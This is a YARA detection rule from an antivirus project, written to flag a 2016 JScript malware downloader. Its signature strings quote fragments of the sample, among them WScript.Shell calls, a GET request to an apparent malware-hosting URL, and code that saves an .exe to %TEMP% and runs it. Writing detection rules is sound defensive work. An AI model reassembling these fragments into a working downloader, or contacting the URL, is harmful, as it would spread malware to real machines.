rule sig_20160328_89771a6b21416d8b00fa71166bc83063 {
  meta:
    description = "datamaliciousorder - file 20160328_89771a6b21416d8b00fa71166bc83063.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bade6621e85aa3d9777c93f48445656522dd4b3159f3a424130516a28dfa8987"

  strings:
    $s1  = "function Jwkihovgx() {return Amntw[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"eYyT9N4Y1M.exe\";};" fullword ascii
    $s2  = "do {WScript[Ekbmqaj](Iroitry() * 11)} while (Owtdbnysj[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Kadnwlspqi(Btbkv, Ixrmb){return Btbkv - Ixrmb;};" fullword ascii
    $s4  = "var Amntw = function Vkjbg() {return WScript[Ckgzyax](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Owtdbnysj[Ukoknifgzq](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s6  = "function Wquzrvuh(Eacczki){Amntw[\"Run\"](Eacczki, Rnucsgum, Rnucsgum);};" fullword ascii
    $s7  = "function Ymjgu() {return ((Azgmqvth == true) && (Azgmqvth == Uwhfpyuf)) ? 1 : Rnucsgum;};" fullword ascii
    $s8  = "return Kadnwlspqi(Oskdkb, Hkvtp);" fullword ascii
    $s9  = "Uwhfpyuf = true; " fullword ascii
    $s10 = "function Gvniku(Wkump) {var Srvoggk = (1, 2, 3, 4, 5, Wkump); return Srvoggk;};" fullword ascii
    $s11 = "function Xrmdembeq(){return Dojze;};" fullword ascii
    $s12 = "Azgmqvth = true; " fullword ascii
    $s13 = "function Swqbwbujmo()" fullword ascii
    $s14 = " while (Ikaipy){" fullword ascii
    $s15 = "function Iroitry(){return 22;};" fullword ascii
    $s16 = "var Azgmqvth = false;" fullword ascii
    $s17 = "function Krcmcnbkwx(){return Ckgzyax;};" fullword ascii
    $s18 = "var Tttxbnxlh = false;" fullword ascii
    $s19 = "var Dklld = new this[\"Date\"]();" fullword ascii
    $s20 = "var Uwhfpyuf = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}